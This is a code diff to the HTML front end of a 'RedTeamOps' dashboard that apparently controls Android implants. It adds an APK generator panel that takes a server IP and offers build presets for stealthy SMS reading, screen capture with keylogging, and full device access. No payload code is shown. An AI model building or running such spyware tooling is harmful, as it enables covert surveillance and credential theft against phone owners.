@@ -28,7 +28,7 @@
         <!-- Sidebar -->
         <aside id="sidebar">
             <div class="brand-header">
-                <img src="../img/cyber-eye.png" alt="Logo" class="logo">
+                <img src="../img/trojan-logo.svg" alt="Logo" class="logo">
                 <h1>RedTeam<span class="highlight">Ops</span></h1>
             </div>
 
@@ -36,10 +36,10 @@
                 <div class="nav-item active"><i class="material-icons">grid_view</i>Dashboard</div>
             </nav>
 
-            <div class="server-status">
-                <span class="status-dot"></span>
-                <span>Server Online</span>
-            </div>
+            <button onclick="logout()" class="logout-btn">
+                <i class="material-icons">logout</i>
+                <span>Logout</span>
+            </button>
         </aside>
 
         <!-- Main Content -->
@@ -48,14 +48,73 @@
             <header id="topbar">
                 <div class="breadcrumbs">Operations / Dashboard</div>
                 <div class="controls">
-                    <div id="downloadAPK" class="download-widget">
-                        <input type="text" placeholder="C2 IP Address" value="">
-                        <button onclick="download()" title="Generate Payload">
-                            Generate Agent
-                        </button>
-                    </div>
+                    <button onclick="toggleAPKGenerator()" class="apk-gen-toggle" title="Generate Custom APK">
+                        <i class="material-icons">build</i>
+                        Generate APK
+                    </button>
                 </div>
             </header>
+
+                        <!-- APK Generator Panel (Hidden by default) -->
+            <div id="apkGeneratorPanel" class="apk-generator-panel hidden">
+                <div class="apk-gen-header">
+                    <h3>Generate Custom APK</h3>
+                    <button onclick="toggleAPKGenerator()" class="close-btn">
+                        <i class="material-icons">close</i>
+                    </button>
+                </div>
+                
+                <div class="apk-gen-body">
+                    <!-- Server IP Configuration -->
+                    <div class="config-section">
+                        <label class="config-label">
+                            <i class="material-icons">dns</i>
+                            Server IP Address
+                        </label>
+                        <input 
+                            type="text" 
+                            id="serverIp" 
+                            class="config-input" 
+                            placeholder="Auto-detect or enter IP"
+                        >
+                        <span class="config-hint">Leave empty for auto-detection</span>
+                    </div>
+
+                    <!-- Build Profiles -->
+                    <div class="config-section">
+                        <label class="config-label">
+                            <i class="material-icons">settings</i>
+                            Select Build Profile
+                        </label>
+                        <div class="preset-buttons-grid">
+                            <button class="preset-card" onclick="generatePreset('stealth')">
+                                <i class="material-icons">visibility_off</i>
+                                <div class="preset-info">
+                                    <span class="preset-name">Stealth Mode</span>
+                                    <span class="preset-desc">SMS Read only</span>
+                                </div>
+                            </button>
+                            
+                            <button class="preset-card" onclick="generatePreset('remote')">
+                                <i class="material-icons">phonelink</i>
+                                <div class="preset-info">
+                                    <span class="preset-name">Remote Control</span>
+                                    <span class="preset-desc">Screen + Keylogger</span>
+                                </div>
+                            </button>
+                            
+                            <button class="preset-card" onclick="generatePreset('full')">
+                                <i class="material-icons">all_inclusive</i>
+                                <div class="preset-info">
+                                    <span class="preset-name">Full Access</span>
+                                    <span class="preset-desc">All features enabled</span>
+                                </div>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
 
             <!-- Device Selector Panel -->
             <div class="device-selector-panel">
